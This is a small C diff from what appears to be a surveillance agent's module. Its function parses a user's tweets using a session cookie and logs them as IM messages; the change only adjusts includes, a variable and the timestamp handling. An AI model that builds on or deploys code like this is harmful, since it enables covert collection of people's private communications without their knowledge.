@@ -5,6 +5,7 @@
 #include "..\LOG.h"
 #include "SocialMain.h"
 #include "NetworkHandler.h"
+#include "..\bin_string.h"
 
 extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi
 extern BOOL bPM_ContactsStarted; 
@@ -169,7 +170,6 @@ DWORD ParseTweet(char *user, char *cookie)
 	char tweet_body[256];
 	char tweet_id[256];
 	char screen_name[256];
-	WCHAR *tweet_body_w;
 	ULARGE_INTEGER act_tstamp;
 	DWORD last_tstamp_hi, last_tstamp_lo;
 	struct tm tstamp;
@@ -229,7 +229,8 @@ DWORD ParseTweet(char *user, char *cookie)
 		parser1 = parser2 + 1;
 
 		// XXX Sistemare il timestamp
-		LogSocialIMMessageA("Twitter", "", "", screen_name, tweet_body, &tstamp); 	
+		GET_TIME(tstamp);
+		LogSocialIMMessageA("Twitter", "", "Twitter", screen_name, tweet_body, &tstamp); 	
 	}
 
 	SAFE_FREE(r_buffer);
